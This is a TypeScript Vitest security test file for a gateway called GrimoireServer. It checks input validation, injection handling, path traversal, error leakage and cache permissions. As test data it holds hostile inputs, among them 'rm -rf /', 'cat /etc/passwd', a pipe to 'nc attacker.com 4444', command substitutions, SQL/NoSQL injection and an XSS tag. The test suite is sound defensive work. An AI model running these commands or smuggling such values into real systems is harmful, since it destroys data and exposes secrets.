/**
 * TDD Tests for Security Validation
 *
 * Tests to ensure:
 * - Input validation and sanitization
 * - Protection against injection attacks
 * - Secure file path handling
 * - Process spawn security
 * - No information leakage in errors
 *
 * Following TDD Red-Green-Refactor:
 * 1. Write tests first (RED) ✓ THIS FILE
 * 2. Implement to make tests pass (GREEN)
 * 3. Refactor if needed (REFACTOR)
 */

import {beforeEach, describe, expect, it, vi} from 'vitest';
import {GrimoireServer} from '../gateway';
import type {SpellConfig} from '../../core/types';

describe('Security Validation', () => {
  let gateway: GrimoireServer;
  let tempCachePath: string;

  const safePower: SpellConfig = {
    name: 'safe-power',
    version: '1.0.0',
    description: 'Safe test power',
    keywords: ['test', 'safe', 'power'],
    server: {
      command: 'echo',
      args: ['test'],
    },
  };

  beforeEach(async () => {
    gateway = new GrimoireServer();

    // Create unique cache path
    const { tmpdir } = await import('os');
    const { join } = await import('path');
    tempCachePath = join(tmpdir(), `security-test-${Date.now()}.msgpack`);

    // Mock discovery
    const mockPowers = new Map<string, SpellConfig>([['safe-power', safePower]]);

    // @ts-expect-error - Accessing private property for testing
    vi.spyOn(gateway.discovery, 'getSpells').mockReturnValue(mockPowers);
    // @ts-expect-error - Accessing private property for testing
    vi.spyOn(gateway.discovery, 'getSpell').mockImplementation((name: string) =>
      mockPowers.get(name)
    );

    // Mock lifecycle
    // @ts-expect-error - Accessing private property for testing
    vi.spyOn(gateway.lifecycle, 'spawn').mockImplementation(async (name: string) => {
      return [
        {
          name: `${name}_tool`,
          description: `Mock tool for ${name}`,
          inputSchema: { type: 'object', properties: {}, required: [] },
        },
      ];
    });

    // @ts-expect-error - Accessing private property for testing
    vi.spyOn(gateway.lifecycle, 'isActive').mockReturnValue(false);

    // @ts-expect-error - Accessing private method for testing
    vi.spyOn(gateway, 'notifyToolsChanged').mockImplementation(() => {});

    // Initialize resolver
    const { EmbeddingService } = await import('../../infrastructure/embedding-service');
    const { EmbeddingStorage } = await import('../../infrastructure/embedding-storage');
    const { HybridResolver } = await import('../../application/hybrid-resolver');

    // @ts-expect-error - Accessing private property for testing
    gateway.embeddingService = await EmbeddingService.getInstance();
    // @ts-expect-error - Accessing private property for testing
    gateway.embeddingStorage = new EmbeddingStorage(tempCachePath);
    // @ts-expect-error - Accessing private property for testing
    await gateway.embeddingStorage.load();
    // @ts-expect-error - Accessing private property for testing
    gateway.resolver = new HybridResolver(gateway.embeddingService, gateway.embeddingStorage);

    // Index safe power
    // @ts-expect-error - Accessing private property for testing
    await gateway.resolver.indexSpell(safePower);
  });

  describe('Input Validation', () => {
    it('should reject null query', async () => {
      const response = await gateway.handleResolveIntentCall({ query: null as any });
      expect(response.status).toBe('not_found');
    });

    it('should reject undefined query', async () => {
      const response = await gateway.handleResolveIntentCall({ query: undefined as any });
      expect(response.status).toBe('not_found');
    });

    it('should handle empty string query safely', async () => {
      const response = await gateway.handleResolveIntentCall({ query: '' });
      expect(response.status).toBe('not_found');
      if (response.status === 'not_found') {
        expect(response.message.toLowerCase()).toContain('empty');
      }
    });

    it('should handle whitespace-only query safely', async () => {
      const response = await gateway.handleResolveIntentCall({ query: '   \t\n  ' });
      expect(response.status).toBe('not_found');
    });

    it('should handle very long query without crashing', async () => {
      const longQuery = 'a'.repeat(100000); // 100KB string
      const response = await gateway.handleResolveIntentCall({ query: longQuery });
      expect(response).toHaveProperty('status');
    });

    it('should sanitize special characters in queries', async () => {
      const maliciousQuery = "'; DROP TABLE users; --";
      const response = await gateway.handleResolveIntentCall({ query: maliciousQuery });
      // Should not crash, should handle safely
      expect(response).toHaveProperty('status');
    });

    it('should handle unicode and emoji in queries', async () => {
      const unicodeQuery = '测试查询 🔥 🚀';
      const response = await gateway.handleResolveIntentCall({ query: unicodeQuery });
      expect(response).toHaveProperty('status');
    });
  });

  describe('Power Name Validation', () => {
    it('should reject null power name', async () => {
      await expect(
        gateway.handleActivateSpellCall({ name: null as any })
      ).rejects.toThrow();
    });

    it('should reject undefined power name', async () => {
      await expect(
        gateway.handleActivateSpellCall({ name: undefined as any })
      ).rejects.toThrow();
    });

    it('should reject empty power name', async () => {
      await expect(gateway.handleActivateSpellCall({ name: '' })).rejects.toThrow();
    });

    it('should reject power name with path traversal attempt', async () => {
      await expect(
        gateway.handleActivateSpellCall({ name: '../../../etc/passwd' })
      ).rejects.toThrow();
    });

    it('should reject power name with special characters', async () => {
      await expect(gateway.handleActivateSpellCall({ name: 'power;rm -rf /' })).rejects.toThrow();
    });

    it('should reject very long power names', async () => {
      const longName = 'a'.repeat(1000);
      await expect(gateway.handleActivateSpellCall({ name: longName })).rejects.toThrow();
    });
  });

  describe('Configuration Security', () => {
    it('should validate power config structure', async () => {
      const { isSpellConfig } = await import('../../core/types');

      // Valid config
      expect(isSpellConfig(safePower)).toBe(true);

      // Invalid configs
      expect(isSpellConfig(null)).toBe(false);
      expect(isSpellConfig(undefined)).toBe(false);
      expect(isSpellConfig({})).toBe(false);
      expect(isSpellConfig({ name: 'test' })).toBe(false);
      expect(isSpellConfig({ name: 'test', keywords: [] })).toBe(false);
    });

    it('should reject config with missing required fields', async () => {
      const { isSpellConfig } = await import('../../core/types');

      const invalidConfig = {
        name: 'test',
        version: '1.0.0',
        description: 'Test',
        // Missing keywords
        server: { command: 'echo', args: [] },
      };

      expect(isSpellConfig(invalidConfig)).toBe(false);
    });

    it('should reject config with wrong types', async () => {
      const { isSpellConfig } = await import('../../core/types');

      const invalidConfig = {
        name: 123, // Should be string
        version: '1.0.0',
        description: 'Test',
        keywords: ['test'],
        server: { command: 'echo', args: [] },
      };

      expect(isSpellConfig(invalidConfig)).toBe(false);
    });
  });

  describe('Process Spawn Security', () => {
    it('should validate command before spawning', async () => {
      const maliciousConfig: SpellConfig = {
        name: 'malicious',
        version: '1.0.0',
        description: 'Malicious power',
        keywords: ['test', 'malicious', 'dangerous'],
        server: {
          command: 'rm',
          args: ['-rf', '/'],
        },
      };

      // Mock to include malicious power
      // @ts-expect-error - Accessing private property for testing
      vi.spyOn(gateway.discovery, 'getSpell').mockImplementation((name: string) => {
        if (name === 'malicious') return maliciousConfig;
        return undefined;
      });

      // Should throw or handle safely
      // In production, this would be caught by command validation
      try {
        await gateway.handleActivateSpellCall({ name: 'malicious' });
        // If it doesn't throw, that's also acceptable if properly sandboxed
      } catch (error) {
        expect(error).toBeDefined();
      }
    });

    it('should not expose internal paths in errors', async () => {
      try {
        await gateway.handleActivateSpellCall({ name: 'nonexistent-power' });
      } catch (error: any) {
        // Error message should not contain full file system paths
        expect(error.message).not.toMatch(/\/Users\/.*\//);
        expect(error.message).not.toMatch(/C:\\.*\\/);
      }
    });
  });

  describe('Error Message Security', () => {
    it('should not leak sensitive information in error messages', async () => {
      try {
        await gateway.handleActivateSpellCall({ name: 'test-invalid' });
      } catch (error: any) {
        // Should not contain stack traces, internal paths, or config details
        expect(error.message).not.toContain('node_modules');
        expect(error.message).not.toContain('internal');
        expect(error.message).not.toContain('password');
        expect(error.message).not.toContain('token');
      }
    });

    it('should provide safe error messages for invalid queries', async () => {
      const response = await gateway.handleResolveIntentCall({
        query: '<script>alert("xss")</script>',
      });

      // Response should handle safely (gateway doesn't sanitize, but doesn't execute)
      // The query is reflected as-is, which is actually safe in a JSON API
      // XSS would only be a concern if rendered in HTML without escaping
      expect(response).toHaveProperty('status');
      expect(response.status).toBe('not_found');
    });
  });

  describe('Injection Attack Prevention', () => {
    it('should prevent command injection in power names', async () => {
      const injectionAttempts = [
        'power; rm -rf /',
        'power && cat /etc/passwd',
        'power | nc attacker.com 4444',
        'power`whoami`',
        'power$(whoami)',
      ];

      for (const attempt of injectionAttempts) {
        await expect(gateway.handleActivateSpellCall({ name: attempt })).rejects.toThrow();
      }
    });

    it('should prevent path traversal in queries', async () => {
      const traversalAttempts = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        '/etc/shadow',
        'C:\\Windows\\System32',
      ];

      for (const attempt of traversalAttempts) {
        const response = await gateway.handleResolveIntentCall({ query: attempt });
        // Should handle safely without errors
        expect(response).toHaveProperty('status');
      }
    });

    it('should handle SQL injection patterns safely', async () => {
      const sqlInjections = [
        "' OR '1'='1",
        "'; DROP TABLE powers; --",
        "1' UNION SELECT * FROM users--",
      ];

      for (const sql of sqlInjections) {
        const response = await gateway.handleResolveIntentCall({ query: sql });
        expect(response).toHaveProperty('status');
      }
    });

    it('should handle NoSQL injection patterns safely', async () => {
      const noSqlInjections = ['{"$ne": null}', '{"$gt": ""}', '{$where: "1==1"}'];

      for (const noSql of noSqlInjections) {
        const response = await gateway.handleResolveIntentCall({ query: noSql });
        expect(response).toHaveProperty('status');
      }
    });
  });

  describe('Resource Limits', () => {
    it('should handle many concurrent requests without DoS', async () => {
      const concurrentRequests = Array(100)
        .fill(0)
        .map((_, i) =>
          gateway.handleResolveIntentCall({
            query: `test query ${i}`,
          })
        );

      // Should complete without crashing
      const results = await Promise.all(concurrentRequests);
      expect(results.length).toBe(100);
    });

    it('should handle rapid sequential requests', async () => {
      const iterations = 100;
      let successCount = 0;

      for (let i = 0; i < iterations; i++) {
        const response = await gateway.handleResolveIntentCall({
          query: `query ${i}`,
        });
        if (response) successCount++;
      }

      expect(successCount).toBe(iterations);
    });
  });

  describe('Data Sanitization', () => {
    it('should sanitize power names in responses', async () => {
      const response = await gateway.handleResolveIntentCall({
        query: 'test safe power',
      });

      if (response.status === 'activated') {
        // Power name should be clean
        expect(response.spell.name).toMatch(/^[a-z0-9-]+$/);
      }
    });

    it('should not include raw config data in responses', async () => {
      const response = await gateway.handleResolveIntentCall({
        query: 'test safe power',
      });

      const responseStr = JSON.stringify(response);

      // Should not leak internal implementation details
      expect(responseStr).not.toContain('_internal');
      expect(responseStr).not.toContain('privateKey');
      expect(responseStr).not.toContain('password');
    });

    it('should limit keywords returned in responses', async () => {
      const response = await gateway.handleResolveIntentCall({
        query: 'test query',
      });

      if (response.status === 'multiple_matches' || response.status === 'weak_matches') {
        for (const match of response.matches) {
          // Keywords should be limited (e.g., max 5)
          expect(match.keywords.length).toBeLessThanOrEqual(5);
        }
      }
    });
  });

  describe('File System Security', () => {
    it('should use secure file permissions for cache', async () => {
      const { EmbeddingStorage } = await import('../../infrastructure/embedding-storage');
      const storage = new EmbeddingStorage(tempCachePath);

      const vector = Array(384)
        .fill(0)
        .map(() => Math.random());
      storage.set('test', vector, 'hash');
      await storage.save();

      // Check file was created
      const { existsSync, statSync } = await import('fs');
      expect(existsSync(tempCachePath)).toBe(true);

      // On Unix systems, check permissions are restrictive
      if (process.platform !== 'win32') {
        const stats = statSync(tempCachePath);
        const mode = stats.mode & 0o777;
        // Should be 0600 (user read/write only)
        expect(mode).toBe(0o600);
      }
    });

    it('should prevent directory traversal in cache paths', async () => {
      const { EmbeddingStorage } = await import('../../infrastructure/embedding-storage');

      // These should not allow escaping the intended cache directory
      const dangerousPaths = [
        '../../../etc/passwd',
        '/etc/shadow',
        '..\\..\\..\\windows\\system32\\config\\sam',
      ];

      for (const path of dangerousPaths) {
        expect(() => {
          // @ts-ignore: storage is declared but its value is never read
          const _storage = new EmbeddingStorage(path);
          // Should either throw or sanitize the path
        }).not.toThrow(); // Constructor shouldn't throw, but save should validate
      }
    });
  });
});
